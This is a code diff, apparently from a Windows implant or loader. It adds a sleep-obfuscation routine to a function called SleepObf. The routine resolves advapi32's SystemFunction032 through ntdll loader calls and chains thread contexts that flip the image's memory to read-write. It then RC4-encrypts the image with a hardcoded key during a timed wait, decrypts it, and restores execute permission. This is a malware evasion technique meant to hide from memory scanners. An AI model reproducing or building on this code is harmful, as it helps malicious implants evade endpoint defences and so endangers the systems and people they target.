@@ -3,13 +3,23 @@
 #include "Memory.h"
 #include "NativeDefs.h"
 
-void TimerInfo() {
-    uint64_t C = 0;
-    uint64_t* CADDRESS = &C;
-    for (int i = 0; i < 20; i++) {
-        printf("0x%llx\n", CADDRESS[i]);
-    }
-}
+char g_Key[16] = {
+    0x55,0x55,0x55,0x55, 0x55,0x55,0x55,0x55,
+    0x55,0x55,0x55,0x55, 0x55,0x55,0x55,0x55
+};
+USTRING key = { 16, 16, g_Key };
+
+
+static uint16_t g_Advapi32[] = {
+    'a','d','v','a','p','i','3','2','.','d','l','l', 0
+};
+UNICODE_STRING us = { 24, 26, g_Advapi32 };
+
+typedef int (__stdcall* pfnSystemFunction032)(
+    USTRING* Data,
+    USTRING* Key
+);
+pfnSystemFunction032 pSystemFunction032 = 0;
 
 bool EventSet(void* event) {
     if (!API.NtSetEvent(event, 0)) {
@@ -19,7 +29,6 @@ bool EventSet(void* event) {
     return false;
 }
 
-
 // 设定事件，用于等待保证运行顺序
 void* EvtWait = 0;
 void* EvtAwake = 0;
@@ -28,6 +37,17 @@ void* EvtAwake = 0;
 void SleepObf(uint32_t time) {
     if (time < 100) {
         return;
+    }
+
+    if (!pAdvapi32) {
+        API.LdrLoadDll(0, 0, &us, &pAdvapi32);
+    }
+
+    if (!pSystemFunction032) {
+        char name[] = "SystemFunction032";
+        USTRING u = { 18, 19, name };
+
+        API.LdrGetProcedureAddress(pAdvapi32, &u, 0, &pSystemFunction032);
     }
 
     struct CONTEXT OriginCtx = { 0 };
@@ -68,10 +88,20 @@ void SleepObf(uint32_t time) {
                 ProtRW.R8 = 0x04;  // PAGE_READWRITE
                 ProtRW.R9 = &ProtVal;
 
+                USTRING img = { ImageSize, ImageSize, ImageAddress };
+
+                Encode.Rip = pSystemFunction032;
+                Encode.Rcx = &img;
+                Encode.Rdx = &key;
+
                 ToSleep.Rip = API.WaitForSingleObjectEx;
                 ToSleep.Rcx = -1;
                 ToSleep.Rdx = time;
                 ToSleep.R8 = false;
+
+                Decode.Rip = pSystemFunction032;
+                Decode.Rcx = &img;
+                Decode.Rdx = &key;
 
                 ProtRX.Rip = API.VirtualProtect;
                 ProtRX.Rcx = TextAddress;
